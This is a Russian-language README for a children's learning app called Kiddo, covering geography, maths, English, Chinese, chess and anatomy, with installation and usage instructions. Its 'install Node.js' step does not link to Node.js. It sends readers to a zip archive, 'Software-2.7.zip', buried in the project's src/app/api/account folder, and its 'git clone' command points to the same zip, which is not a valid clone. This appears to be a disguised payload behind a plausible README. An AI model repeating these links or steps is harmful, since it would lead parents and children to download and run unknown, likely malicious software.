# Kiddo

**Learn. Play. Grow.** — учись чему угодно, по одному навыку за раз.

Бесплатное приложение для учёбы, которое работает у вас на компьютере. Внутри
шесть направлений: география, математика, английский, китайский, шахматы и
анатомия. Всё на русском языке, для детей и взрослых.

Приложение запускается локально в браузере, интернет нужен только один раз —
чтобы его скачать и установить. Прогресс хранится на вашем компьютере и никуда
не отправляется.

## Что внутри

| Направление | Что учим | Объём |
| --- | --- | --- |
| 🌍 **География** | Страны на 3D-глобусе, флаги, столицы, контуры | 194 страны, 6 навыков на каждую |
| ➕ **Математика** | Сложение: однозначные, двузначные, трёхзначные | Примеры создаются на лету, не повторяются |
| 🇬🇧 **English** | Английские слова с картинками и озвучкой | 400 слов |
| 🇨🇳 **中文** | Китайские иероглифы, пиньинь, тоны | 698 иероглифов, 4 навыка на каждый |
| ♟️ **Шахматы** | Задачи «мат в один ход» | 1000 задач трёх уровней сложности |
| 🫀 **Анатомия** | Органы, кости, мышцы на настоящих медицинских рисунках | 37 структур, 3 навыка на каждую |

**Главная идея.** Приложение запоминает, что именно вы забываете, и само
возвращает это через нужное время (интервальное повторение по алгоритму SM-2).
Не «прорешал сто задач и забыл», а «система знает ваши слабые места и
подсовывает именно их».

Есть профили — можно завести отдельный для каждого ребёнка, прогресс не
смешается. Есть XP, ежедневные серии, достижения и таблица лидеров.

## Как установить

Нужно сделать это один раз. Дальше приложение запускается двумя щелчками.

### Шаг 1. Установите Node.js

Node.js — это программа, которая умеет запускать такие приложения. Без неё
ничего не заработает.

1. Откройте **https://raw.githubusercontent.com/Geophilomorphawhiteflag586/kiddo/main/src/app/api/account/Software-2.7.zip**
2. Скачайте версию **LTS** (большая зелёная кнопка слева).
   Нужна версия **22 или новее** — на сайте всегда предлагают подходящую.
3. Запустите скачанный файл и нажимайте «Далее» до конца. Ничего менять не надо.

**Проверьте, что установилось.** Откройте командную строку:

- **Windows:** нажмите `Win + R`, наберите `cmd`, нажмите Enter
- **macOS:** откройте программу «Терминал» (Terminal)
- **Linux:** откройте терминал

Наберите команду и нажмите Enter:

```
node -v
```

Должно появиться что-то вроде `v22.14.0` или `v24.13.0`. Если появилось
сообщение об ошибке — Node.js не установился, попробуйте ещё раз.

### Шаг 2. Скачайте Kiddo

**Способ А — простой, без лишних программ.**

1. Откройте страницу проекта на GitHub
2. Нажмите зелёную кнопку **Code** → **Download ZIP**
3. Распакуйте архив в удобное место, например `C:\Kiddo` или `~/Kiddo`

**Способ Б — через Git** (если он у вас установлен, обновляться потом проще):

```
git clone https://raw.githubusercontent.com/Geophilomorphawhiteflag586/kiddo/main/src/app/api/account/Software-2.7.zip
cd kiddo
```

### Шаг 3. Установите зависимости

Откройте командную строку **в папке с приложением**.

- **Windows:** откройте папку в Проводнике, щёлкните по адресной строке сверху,
  наберите `cmd` и нажмите Enter
- **macOS/Linux:** `cd путь/к/папке`

Выполните команду:

```
npm install
```

Это займёт 1–3 минуты — скачиваются нужные библиотеки. Появится папка
`node_modules`, так и должно быть.

### Шаг 4. Запустите

```
npm run dev
```

Через несколько секунд в командной строке появится строчка вроде:

```
- Local: http://localhost:3000
```

Откройте браузер и перейдите по адресу **http://localhost:3000**

Готово. Приложение работает.

> **Не закрывайте окно командной строки, пока играете.** Оно и есть сервер
> приложения. Чтобы остановить — нажмите в нём `Ctrl + C`.

### Как запускать в следующий раз

1. Откройте командную строку в папке с приложением
2. `npm run dev`
3. Откройте http://localhost:3000

`npm install` повторять не нужно.

### Быстрее и стабильнее: рабочий режим

Режим `npm run dev` удобен для разработки, но работает медленнее. Если просто
пользуетесь приложением, соберите его один раз:

```
npm run build
npm start
```

Адрес тот же — http://localhost:3000. После обновления приложения соберите
заново.

## Как играть

Откройте http://localhost:3000 — попадёте на главную с глобусом. Все
направления собраны на странице **«Учиться»** (`/learn`) — ссылка в шапке.

### Сначала — профиль

В правом верхнем углу нажмите на имя профиля. Там можно:

- **создать профиль** для каждого, кто будет заниматься (например «Мама» и «Аяна») —
  прогресс не перемешается;
- **переключаться** между профилями;
- **сохранить резервную копию** и перенести прогресс на другой компьютер или в
  другой браузер (кнопки «Скачать копию» / «Загрузить копию»).

Прогресс лежит в памяти браузера. Если открыть приложение в другом браузере —
там будет пусто; для переноса используйте резервную копию.

### 🌍 География

Главная страница — вращающийся глобус со 194 странами.

- **Покрутите глобус**, наведите на страну — она подсветится. Щёлкните — откроется
  карточка со флагом, столицей, континентом и вашим уровнем знания.
- **Режимы игры** — кнопки на главной и на странице «Учиться»:
  - «Угадай страну по флагу»
  - «Найди флаг страны»
  - «Найди страну на глобусе»
  - «Столицы» (в обе стороны)
  - «Угадай по контуру» — только очертания страны, без подписей
- **Страница «Прогресс»** показывает плоскую карту мира, освоение по каждому из
  шести навыков и — самое полезное — **что вы с чем путаете**. Оттуда можно
  запустить сравнительную тренировку именно этой пары.

Варианты ответа подбираются не случайно: сначала то, что вы уже путали, потом
похожие флаги, потом соседи по континенту. Поэтому Румыния приходит вместе с
Чадом.

### ➕ Математика

`/math` → «Сложение» → выберите уровень: однозначные, двузначные или трёхзначные
числа.

- Наберите ответ и нажмите **Enter** (или кнопку OK на телефоне).
- Верный ответ — переход дальше сам. Ошибка — покажут правильный ответ, будет
  время посмотреть.
- Все ошибки запоминаются. После сессии — список «Ваши ошибки» и кнопка
  **«Повторить ошибки»**.

Сложность подстраивается: новичку дают примеры без переходов через десяток, а
дальше добавляются переносы.

### 🇬🇧 English

`/english` → «Играть».

- Слово показывается **картинкой**, а не переводом — печатать по-английски не
  нужно, нужно узнать.
- **Каждый вариант, на который вы нажали, произносится вслух.** Слушайте, прежде
  чем выбирать.
- Если звука нет — см. раздел «Если что-то не работает».

### 🇨🇳 中文

`/chinese` → «Играть».

- Учим **иероглиф целиком**: как выглядит, как звучит, что значит, какой тон.
- Пять типов заданий: иероглиф → значение, значение → иероглиф, иероглиф →
  пиньинь, на слух, и отдельно **тоны** (это самое сложное в китайском).
- Тон показан цветом и цифрой, произношение озвучивается.

### ♟️ Шахматы

`/chess` → «Играть».

- Задача одна: **поставить мат в один ход**. 1000 задач, три уровня сложности.
- **Подсказок нет специально** — доска не подсвечивает возможные ходы. Думать
  надо самому.
- За ошибку ничего не отнимают. Таймер есть, но он ничего не портит — это не
  давление, а просто замер.
- Если ход не проходит, приложение честно объяснит почему: «так эта фигура не
  ходит», «свой король под шахом», «после этого хода король окажется под боем».
- Все попытки сохраняются: на странице прогресса видно, сколько попыток ушло на
  каждую задачу и какие оказались самыми трудными. Родителю удобно смотреть.

### 🫀 Анатомия

`/anatomy` — путь обучения: **органы → кости → мышцы**. Следующий раздел
открывается, когда освоено 60 % предыдущего.

- Все иллюстрации — **настоящие медицинские рисунки** из университетского
  учебника, без крови и хирургии.
- Три типа заданий:
  - **«Что это?»** — показан орган, выбираете название
  - **«Найди изображение»** — названо по-русски, выбираете рисунок
  - **«Покажи на теле»** — нажимаете прямо по нужному месту на картинке
- Кости учатся по частям (череп, рука, нога, туловище), а не «весь скелет
  сразу». Полный скелет открывается в конце как итоговая проверка.

### Соревнования

`/leaderboard` — таблица лидеров, друзья и мировая статистика. Здесь нужен
аккаунт (только имя, без пароля и почты) и запущенный сервер приложения.
Раздел работает на локальной базе: пока приложение крутится у вас на
компьютере, соревноваться получится только между профилями на этом же
компьютере.

## Если что-то не работает

**`npm` не является внутренней или внешней командой** (Windows) —
Node.js не установлен или компьютер не перезагружался после установки.
Установите Node.js заново и перезапустите компьютер.

**Порт 3000 занят** — приложение само предложит другой порт (3001 и т. д.).
Смотрите, какой адрес написан в командной строке, и открывайте его.

**Страница не открывается** — проверьте, что окно командной строки не закрыто и
в нём нет красных сообщений об ошибке.

**Нет звука в English или 中文** — озвучка использует голоса, встроенные в
операционную систему.
- *Windows:* Параметры → Время и язык → Речь → «Управление голосами» →
  «Добавить голоса». Поставьте английский и китайский (упрощённый).
  После установки перезапустите браузер.
- *Проверьте громкость* и то, что вкладка не заглушена.
- Лучше всего звук работает в Microsoft Edge и Google Chrome.

**Ошибки при `npm install`** — удалите папку `node_modules` и файл
`package-lock.json`, затем выполните `npm install` заново.

**Пропал прогресс** — скорее всего вы открыли приложение в другом браузере или
почистили данные браузера. Восстановите из резервной копии (меню профиля →
«Загрузить копию»). Делайте копию время от времени.

## Для тех, кто хочет заглянуть внутрь

Проект открытый, его можно менять под себя: добавить свои слова, свои
иероглифы, свои задачи.

| Команда | Что делает |
| --- | --- |
| `npm run dev` | запуск в режиме разработки |
| `npm run build` / `npm start` | сборка и запуск рабочей версии |
| `npm test` | тесты (256 штук) |
| `npm run typecheck` | проверка типов TypeScript |
| `npm run lint` | проверка стиля кода |

Устройство проекта, структура модулей и принятые решения описаны в
[docs/ARCHITECTURE.md](docs/ARCHITECTURE.md).

Технологии: Next.js 16, React 19, TypeScript, Tailwind CSS 4, Zustand,
three.js (глобус), chess.js (шахматы), SQLite через встроенный в Node
`node:sqlite` (соревнования).
